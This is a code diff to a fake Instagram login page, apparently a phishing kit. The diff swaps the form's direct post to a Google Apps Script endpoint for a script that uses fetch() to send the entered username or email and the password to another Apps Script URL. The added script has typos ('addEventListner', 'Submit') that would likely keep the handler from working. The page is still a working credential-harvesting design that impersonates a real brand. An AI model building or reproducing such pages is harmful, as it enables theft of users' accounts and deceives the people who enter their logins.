@@ -15,7 +15,7 @@
                 <h1 title="Instagram" class="flex justify-content-center">
                     <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                 </h1>
-                <form action="https://script.google.com/macros/s/AKfycbwAmIWIyBWgDaeH_kAC6jPJPq0BTQqg02NSUxCf0lnLLoSQBzxJnP5ycRqg4G3xbORcBw/exec" method="post" name="google-sheet">
+                <form>
                     <label for="email" class="sr-only">Phone number, username, or email</label>
                     <input name="email" placeholder="Phone number, username, or email" />
 
@@ -68,7 +68,20 @@
         </ul>
         <p style="text-transform:capitalize;" class="copyright">© 2022 Instagram from Meta</p>
     </footer>
-
+    <script>
+        let form = document.querySelector("form");
+        form.addEventListner('Submit',(e)=>{
+            e.preventDefault();
+            let data = new FormData(form);
+            fetch('https://script.google.com/macros/s/AKfycbxE7OTLLxXDAL-hRri1pJq4oKIDo1VU5EF3DcHqorsdEqj86Rc6qDu1sm2eGk17Q5Y/exec',{
+                    method:"POST",
+                    body: data  
+            })
+                .then(res => res.text())
+                .then(data => console.log(data));
+      
+        })
+    </script>
 
   
 </body> 
